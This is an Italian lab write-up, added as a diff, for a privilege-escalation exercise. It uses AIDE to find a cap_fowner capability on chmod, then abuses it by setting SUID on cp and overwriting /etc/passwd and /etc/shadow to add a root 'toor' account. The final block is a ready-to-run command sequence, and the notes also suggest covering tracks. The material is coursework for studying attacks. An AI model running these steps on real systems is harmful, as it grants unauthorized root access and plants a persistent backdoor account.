@@ -1,0 +1,114 @@
+
+->Passaggi per la soluzione dell'esercizio di PrivEsc:
+
+	• configuro /etc/aide/aide.conf nel seguente modo: 
+----------------------------------------------//
+# Databases Path
+database=file:/var/lib/aide/aide.db database_out=file:/var/lib/aide/aide.db.new database_new=file:/var/lib/aide/aide.db.new
+
+# Set your own AIDE rule
+SecLabRule=p+n+u+g+s+m+c+xattrs+md5+sha512
+
+#Direc/files to monitor with rules
+/etc SecLabRule 
+#/bin SecLabRule 
+/usr/bin SecLabRule
+
+# Dir to ignore
+/home
+/sec SecLabRule 
+!/root
+---------------------------------------------//
+
+in tal modo riesco a monitorare le cartelle d'interesse /etc e /usr/bin
+
+	• inizializzo la configurazione del db lanciando:
+sudo aide -c /etc/aide/aide.conf -i
+
+	• copio il database con: 
+sudo cp /var/lib/aide/aide.db{.new,}
+
+	• controllo che l'op sia andata a buon fine (risultato 0)
+
+	• lancio per controllare di nuovo che l'op restituisca 0: 
+aide -c /home/kali/aide/aide.conf --config-check
+
+	• a questo punto rendo change eseguibile con:
+chmod +x ./change
+
+	• lancio il comando e controllo i cambiamenti con: 
+sudo aide -c /etc/aide/aide.conf -C
+
+	• vedo che questi file hanno subito una modifica: 
+
+File: /etc/passwd Ctime : 2024-02-09 06:19:22 -0500 | 2024-02-10 04:12:26 -0500
+
+File: /etc/shadow Perm : -rw-r----- | -rw------- Ctime : 2024-02-09 06:19:22 -0500 | 2024-02-10 04:12:26 -0500
+
+File: /usr/bin/chmod Ctime : 2022-12-05 08:53:09 -0500 | 2024-02-10 04:12:26 -0500 XAttrs : num=0 | num=1 | [1] security.capability <=> AQAA | AggAAAAAAAAAAAAAAAAAAAA=
+
+File: /usr/bin/tail Ctime : 2022-12-05 08:53:09 -0500 | 2024-02-10 04:12:26 -0500 XAttrs : num=0 | num=1 | [1] security.capability <=> AAAA | AgAAAAAAAAAAAAAAAAAAAAA=`
+
+
+	• provo a vedere le capabilities con getcap -r oppure se hanno il SUID settato con ls -la [comando]
+
+----------------------------------------------------------------
+NB: la sintassi corretta di getcap è: getcap -r <nomedelfile>
+----------------------------------------------------------------
+
+	• i risultati sono: /usr/bin/chmod cap_fowner=ep; /usr/bin/tail =
+
+	• devo cercare di sfruttare /usr/bin/chmod per una privEsc
+
+	• le strategie che mi vengono in mente sono 2:
+
+	1 rendere scrivile /etc/passwd con chmod o+w e scrivere in append con echo
+	
+	2 rendere un altro comando eseguibile come /usr/bin/cp (come fatto vedere a lezione)
+
+
+	• Proviamo a usare la seconda strategia con:
+chmod u+s /bin/cp;
+
+-------------------------------------------------------------------------------------------
+NB: L'operazione chmod u+s /bin/cp è un esempio di come impostare il bit SUID (Set User ID) su un binario eseguibile di Linux. Quando un binario ha il bit SUID impostato, viene eseguito con i privilegi dell'utente proprietario del file, anziché con i privilegi dell'utente che lo esegue. Nel contesto di un'escalation dei privilegi, questo significa che un utente normale potrebbe eseguire /bin/cp con i privilegi di root se il bit SUID è impostato e il file è di proprietà di root.
+--------------------------------------------------------------------------------------------
+
+	• otteniamo ls -la /usr/bin/cp -rwsr-xr-x 1 root root 151152 Sep 20 2022 /usr/bin/cp
+
+	• copiamo i file /etc/passwd ed /etc/shadow su file temporanei con:
+cp /etc/passwd tempPasswd
+
+	• creo l'hash della password gotRoot con (non specifico salt o alg di hashing):
+openssl passwd gotRoot
+
+	• l'hash creato è il seguente: 
+$1$kll9aWJ6$qMNag9wCNqcKs8CgGSE3t.
+
+	• aggiungo la entry a /etc/passwd nel seguente modo: 
+toor:$1$kll9aWJ6$qMNag9wCNqcKs8CgGSE3t.:0:0:root:/root:/usr/bin/zsh 
+
+tale entry la aggiungo direttamente a /etc/passwd anche se la sintassi tipica sarebbe [utente]:x:0:0:.... a noi importa che i bit rimangano entrambi a 0 e 0 per i privilegi di root, scegliamo noi lo username la x è il riferimento alla password hashata nel file /etc/shadow, nel nostro caso possiamo direttamente mettere l'hash
+
+	• copiamo il file al file d'origine con:
+cp tempPasswd /etc/passwd
+
+	• ora possiamo finalizzare la privEsc diventando root
+
+	• ora in uno scenario reale l'attaccante probabilmente dovrebbe resettare le capabilities per nascondere le tracce del suo operato
+
+
+
+
+----------------PRIVESC con CP che ha il SUID impostato:-------------------------
+cp /etc/passwd ~/p
+cp /etc/shadow ~/s
+cat ~/p  > ~/passwd
+cat ~/s > ~/shadow
+echo "toor:x:0:0::/root:/bin/bash" >> ~/passwd
+echo "toor::19509:0:99999:7:::" >> ~/shadow
+cp ~/passwd /etc/passwd
+cp ~/shadow /etc/shadow
+
+
+
